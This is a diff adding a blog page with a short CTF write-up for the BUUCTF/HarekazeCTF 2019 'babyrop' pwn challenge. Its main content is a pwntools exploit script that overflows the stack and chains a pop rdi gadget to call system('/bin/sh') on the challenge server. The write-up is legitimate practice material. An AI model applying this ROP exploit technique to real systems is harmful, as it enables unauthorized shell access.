@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn [HarekazeCTF_2019]Babyrop | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn [HarekazeCTF_2019]Babyrop</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/18</h2>
+</div>
+
+<main>
+<h1 id="babyrop">babyrop</h1>
+<p>64位简单的栈溢出，找pop rdi传/bin/sh给system()</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e">#sh = process(&#39;./babyrop&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">28946</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./babyrop</span><span style="color:#e6db74">&#39;</span>)
+
+system_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+binsh_addr <span style="color:#f92672">=</span> next(elf<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>))
+
+pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400683</span> <span style="color:#75715e">#ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep pop</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">8</span>) 
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(system_addr)
+
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">What</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s your name?</span><span style="color:#e6db74">&#34;</span>,payload)
+sh<span style="color:#f92672">.</span>interactive() 
+
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200218200119645.png" alt="image-20200218200119645"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
